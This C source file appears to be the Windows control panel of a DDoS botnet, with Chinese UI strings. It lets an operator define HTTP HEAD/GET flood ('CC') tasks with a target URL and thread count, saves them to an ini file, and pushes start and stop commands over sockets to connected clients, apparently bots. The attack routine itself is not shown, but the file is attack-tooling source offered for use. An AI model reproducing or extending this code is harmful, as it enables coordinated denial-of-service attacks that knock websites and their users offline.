#include "main_frame_ddos.h"
#include "frame_tools.h"
#include "km_socket.h"

extern HINSTANCE   hInst;
extern HWND hWndDDOSList;
extern pshare_main g_share_main;
extern pio_socket g_share_io_socket;

HMENU  hMenuDdos;
pddos_task g_ddos_task = NULL;
pddos_task g_ddos_task_tail = NULL;
int listview_ddos_item_mask = 0;
int listview_ddos_item_type = 0;

char ddos_type[][32] =
{
    {"HEAD 无缓冲CC"},
    {"GET 无缓冲CC"}
};
int ddos_type_count = 2;

int ddos_task_listview_insert(pddos_task p_task)
{
    char tmp[256];
    LVITEM lvi;

    lvi.mask        = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM | LVIF_STATE;
    lvi.state       = LVIS_SELECTED;
    lvi.stateMask   = 0;
    lvi.iSubItem    = 0;
    if (p_task->status == 0)
        lvi.pszText     = "停止";
    else if (p_task->status == 1)
        lvi.pszText     = "已启动";
    else
        lvi.pszText     = "已删除";
    lvi.iImage      = 0;
    lvi.iItem       = ListView_GetItemCount(hWndDDOSList);
    lvi.iImage      = 1;

    if (p_task->listview == -1)
        p_task->listview = ListView_InsertItem(hWndDDOSList, &lvi);

    ListView_SetItemText(hWndDDOSList, p_task->listview, 0, lvi.pszText);

    ListView_SetItemText(hWndDDOSList, p_task->listview, 1, ddos_type[p_task->type]);

    itoa(p_task->thread, tmp, 10);
    ListView_SetItemText(hWndDDOSList, p_task->listview, 2, tmp);

    ListView_SetItemText(hWndDDOSList, p_task->listview, 3, p_task->addr);
    return 0;
}

pddos_task ddos_task_find(char *addr)
{
    pddos_task ptmp_task = g_ddos_task;
    while (ptmp_task) {
        if (strcmp(ptmp_task->addr, addr) == 0)
            return ptmp_task;
        ptmp_task = ptmp_task->next;
    }
    return NULL;
}

int ddos_task_insert(pddos_task p_task)
{
    if (ddos_task_find(p_task->addr) != NULL) {
        return 0;
    }
    if (g_ddos_task_tail == NULL) {
        g_ddos_task = p_task;
    } else {
        g_ddos_task_tail->next = p_task;
    }
    g_ddos_task_tail = p_task;
    ddos_task_listview_insert(p_task);
    return 1;
}

int ddos_task_del(pddos_task p_task)
{
    pddos_task ptmp_task = g_ddos_task;
    if (g_ddos_task == p_task) {
        if (g_ddos_task == g_ddos_task_tail) {
            g_ddos_task_tail = NULL;
        }
        g_ddos_task = g_ddos_task->next;
    } else {
        while(ptmp_task->next != p_task) {
            if (ptmp_task->next == NULL)
                break;
            ptmp_task = ptmp_task->next;
        }
        if (ptmp_task->next == p_task) {
            if (p_task == g_ddos_task_tail)
                g_ddos_task_tail = ptmp_task;
            ptmp_task->next = ptmp_task->next->next;
        }
    }
    return 1;
}

int main_frame_ddos_save_init()
{
    char config_path[MAX_PATH], tmp_name[128], tmp[128];;
    int i =0;
    sprintf(config_path, "%skmc.ini", g_share_main->km_cur_path);

    pddos_task ptmp_task = g_ddos_task;

    while (ptmp_task) {
        sprintf(tmp_name, "DDOS_TYPE_%d", i);
        itoa(ptmp_task->type, tmp, 10);
        WritePrivateProfileString("DDOS", tmp_name,  tmp, config_path);

        sprintf(tmp_name, "DDOS_THREAD_%d", i);
        itoa(ptmp_task->thread, tmp, 10);
        WritePrivateProfileString("DDOS", tmp_name,  tmp, config_path);

        sprintf(tmp_name, "DDOS_ADDR_%d", i);
        WritePrivateProfileString("DDOS", tmp_name, ptmp_task->addr, config_path);
        i ++;
        ptmp_task = ptmp_task->next;
    }
    itoa(i, tmp, 10);
    WritePrivateProfileString("DDOS", "TASK_COUNT",  tmp, config_path);
    return 1;
}


int  main_frame_draw_ddos_col()
{
    pddos_task ptmp_task;
    char config_path[MAX_PATH], tmp_name[128];
    int task_count = 0, i = 0;

    insert_list_column_text(hWndDDOSList, 0, 60, "任务状态");
    insert_list_column_text(hWndDDOSList, 1, 100, "攻击类别");
    insert_list_column_text(hWndDDOSList, 2, 50, "并发数");
    insert_list_column_text(hWndDDOSList, 3, 100, "攻击地址");

    hMenuDdos = LoadMenu(hInst, MAKEINTRESOURCE(IDR_MENU4));
    hMenuDdos = GetSubMenu(hMenuDdos, 0);

    sprintf(config_path, "%skmc.ini", g_share_main->km_cur_path);
    task_count = GetPrivateProfileInt("DDOS", "TASK_COUNT", 0, config_path);

    for (i=0; i<task_count; i++) {
        ptmp_task = malloc(sizeof(ddos_task));
        memset(ptmp_task, 0x0, sizeof(ddos_task));
        ptmp_task->listview = -1;

        sprintf(tmp_name, "DDOS_TYPE_%d", i);
        ptmp_task->type = GetPrivateProfileInt("DDOS", tmp_name, 0, config_path);

        sprintf(tmp_name, "DDOS_THREAD_%d", i);
        ptmp_task->thread = GetPrivateProfileInt("DDOS", tmp_name, 0, config_path);

        sprintf(tmp_name, "DDOS_ADDR_%d", i);
        GetPrivateProfileString("DDOS", tmp_name, "0", ptmp_task->addr, 1024, config_path);

        if (!ddos_task_insert(ptmp_task)) {
            free(ptmp_task);
        }
    }

    return 0;
}

int  main_frame_draw_ddos_col_width(int right)
{
    ListView_SetColumnWidth(hWndDDOSList, 0, 60);
    ListView_SetColumnWidth(hWndDDOSList, 1, 100);
    ListView_SetColumnWidth(hWndDDOSList, 2, 50);
    ListView_SetColumnWidth(hWndDDOSList, 3, right-260);
    return 0;
}


int main_frame_event_ddos_del()
{
    pddos_task ptmp_task;
    char text1[512];
    ListView_GetItemText(hWndDDOSList, listview_ddos_item_mask, 3, text1, 512);

    ptmp_task = ddos_task_find(text1);
    if (ptmp_task != NULL) {
        ptmp_task->status = 2;
        ddos_task_listview_insert(ptmp_task);
        ddos_task_del(ptmp_task);
        free(ptmp_task);
    }
    //ListView_DeleteItem(hWndDDOSList, listview_ddos_item_mask);

    main_frame_ddos_save_init();
    return 1;
}

int main_frame_event_ddos_start()
{
    pddos_task ptmp_task = NULL;
    char text1[512];
    ListView_GetItemText(hWndDDOSList, listview_ddos_item_mask, 3, text1, 512);
    ptmp_task = ddos_task_find(text1);
    if (ptmp_task != NULL) {
        pio_socket i_temp = g_share_io_socket;
        while (i_temp){
            if (i_temp->io_type == C_MAIN){
                kms_sock_send(i_temp, 6, 0, 0, (char*)ptmp_task, sizeof(ddos_task));
            }
            i_temp = i_temp->next;
        }
        ptmp_task->status = 1;
        ddos_task_listview_insert(ptmp_task);
    }
    return 1;
}

int main_frame_event_ddos_stop()
{
    pddos_task ptmp_task = NULL;
    char text1[512];
    ListView_GetItemText(hWndDDOSList, listview_ddos_item_mask, 3, text1, 512);
    ptmp_task = ddos_task_find(text1);
    if (ptmp_task != NULL) {
        pio_socket i_temp = g_share_io_socket;
        while (i_temp){
            if (i_temp->io_type == C_MAIN){
                kms_sock_send(i_temp, 6, 1, 0, (char*)ptmp_task, sizeof(ddos_task));
            }
            i_temp = i_temp->next;
        }
        ptmp_task->status = 0;
        ddos_task_listview_insert(ptmp_task);
    }
    return 1;
}

int main_frame_ddos_send_task(pio_socket i_temp)
{
    pddos_task ptmp_task = g_ddos_task;
    while (ptmp_task) {
        if (ptmp_task->status == 1) {
            kms_sock_send(i_temp, 6, 0, 0, (char*)ptmp_task, sizeof(ddos_task));
        }
        ptmp_task = ptmp_task->next;
    }
    return 1;
}

LRESULT __stdcall main_frame_event_notify_ddos_listview(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    #define lpnm ((LPNMHDR)lParam)
    switch(lpnm->code)
    {
    case NM_RCLICK:
        {
            LV_DISPINFO *lpDis = (LV_DISPINFO*)lParam;
            char text1[512]={0};
            sprintf(text1, "%d", lpDis->item.mask);
            listview_ddos_item_mask = lpDis->item.mask;

            if (lpDis->item.mask == -1) {
                EnableMenuItem(hMenuDdos, IDM_DDOS_START, TRUE);
                EnableMenuItem(hMenuDdos, IDM_DDOS_STOP, TRUE);
                EnableMenuItem(hMenuDdos, IDM_DDOS_EDIT, TRUE);
                EnableMenuItem(hMenuDdos, IDM_DDOS_DEL, TRUE);
            } else {
                EnableMenuItem(hMenuDdos, IDM_DDOS_START, FALSE);
                EnableMenuItem(hMenuDdos, IDM_DDOS_STOP, FALSE);
                EnableMenuItem(hMenuDdos, IDM_DDOS_EDIT, FALSE);
                EnableMenuItem(hMenuDdos, IDM_DDOS_DEL, FALSE);

                ListView_GetItemText(lpnm->hwndFrom, lpDis->item.mask, 0, text1, 50);
                if (strcmp(text1, "已启动") == 0) {
                    EnableMenuItem(hMenuDdos, IDM_DDOS_START, TRUE);
                } else {
                    EnableMenuItem(hMenuDdos, IDM_DDOS_STOP, TRUE);
                }
            }
            POINT point;
            GetCursorPos(&point);
            TrackPopupMenu(hMenuDdos, TPM_RIGHTBUTTON, point.x, point.y, 0, hWnd, NULL);
        }
        break;
    }
    return 0;
}

int dlg_proc_process_url(char *url)
{
    int i = 0;
    for (i=0; i<strlen(url); i++) {
        url[i] = (char)tolower((int)url[i]);
        if (url[i] == '\\')
            url[i] = '/';
    }
    if (strstr(url, "/") == NULL) {
        strcat(url, "/");
    }
    return 1;
}

BOOL __stdcall dlg_proc_frame_ddos(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    switch(Message)
    {
    case WM_INITDIALOG:
        {
            int i = 0;
            for (i=0; i<ddos_type_count; i++) {
                SendMessage(GetDlgItem(hWnd, IDC_COMBO1), CB_INSERTSTRING, i, (LPARAM)ddos_type[i]);
            }
            SetWindowText(GetDlgItem(hWnd, IDC_EDIT_THREAD), "10");

            if (listview_ddos_item_type == 2) {
                char text1[512];
                ListView_GetItemText(hWndDDOSList, listview_ddos_item_mask, 1, text1, 512);
                SendMessage(GetDlgItem(hWnd, IDC_COMBO1), CB_SELECTSTRING, 0, (LPARAM)ddos_type[atoi(text1)]);

                ListView_GetItemText(hWndDDOSList, listview_ddos_item_mask, 2, text1, 512);
                SetWindowText(GetDlgItem(hWnd, IDC_EDIT_THREAD), text1);

                ListView_GetItemText(hWndDDOSList, listview_ddos_item_mask, 3, text1, 512);
                SetWindowText(GetDlgItem(hWnd, IDC_EDIT1), text1);
                EnableWindow(GetDlgItem(hWnd, IDC_EDIT1), FALSE);
            }
        }
        break;
    case WM_COMMAND:
        {
            if (LOWORD(wParam) == ID_BT_CANCEL) {
                EndDialog(hWnd, -1);
            } else if (LOWORD(wParam) == ID_BT_OK) {
                int type = SendMessage(GetDlgItem(hWnd, IDC_COMBO1), CB_GETCURSEL, 0, 0);
                if (type == -1) {
                    MessageBox(hWnd, "请选择有效的测试类型", KM_NAME, MB_ICONQUESTION);
                    break;
                }
                if (GetWindowTextLength(GetDlgItem(hWnd, IDC_EDIT1)) < 5) {
                    MessageBox(hWnd, "地址格式错误,正确的应该类似这样:www.tohack.com/index.asp?id=1", KM_NAME, MB_ICONQUESTION);
                    break;
                }

                pddos_task ptmp_task = NULL;
                char text1[512]={0};

                GetWindowText(GetDlgItem(hWnd, IDC_EDIT1), text1, 512);
                dlg_proc_process_url(text1);

                if (strstr(text1, "http://") != NULL) {
                    MessageBox(hWnd, "地址格式错误,正确的应该类似这样:www.tohack.com/index.asp?id=1", KM_NAME, MB_ICONQUESTION);
                    break;
                }
                if (listview_ddos_item_type == 1) {
                    ptmp_task = malloc(sizeof(ddos_task));
                    memset(ptmp_task, 0x0, sizeof(ddos_task));
                    ptmp_task->listview = -1;

                    strcpy(ptmp_task->addr, text1);

                    GetWindowText(GetDlgItem(hWnd, IDC_EDIT_THREAD), text1, 512);
                    ptmp_task->thread = atoi(text1);
                    ptmp_task->type = type;


                    if (!ddos_task_insert(ptmp_task)) {
                        free(ptmp_task);
                        break;
                    }

                    main_frame_ddos_save_init();
                    EndDialog(hWnd, -1);
                } else {
                    GetWindowText(GetDlgItem(hWnd, IDC_EDIT1), text1, 512);
                    ptmp_task = ddos_task_find(text1);
                    if (ptmp_task != NULL) {
                        GetWindowText(GetDlgItem(hWnd, IDC_EDIT_THREAD), text1, 512);
                        ptmp_task->thread = atoi(text1);
                        ptmp_task->type = type;
                        ddos_task_listview_insert(ptmp_task);
                        main_frame_ddos_save_init();
                        EndDialog(hWnd, -1);
                    }
                }
            }
        }
        break;
    case WM_CLOSE:
        {
            EndDialog(hWnd, -1);
        }
        break;
    }
    return FALSE;
}

int make_ddos_initialize(HWND hWnd)
{
    DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG_DDOS), hWnd, dlg_proc_frame_ddos, 0);
    return 0;
}
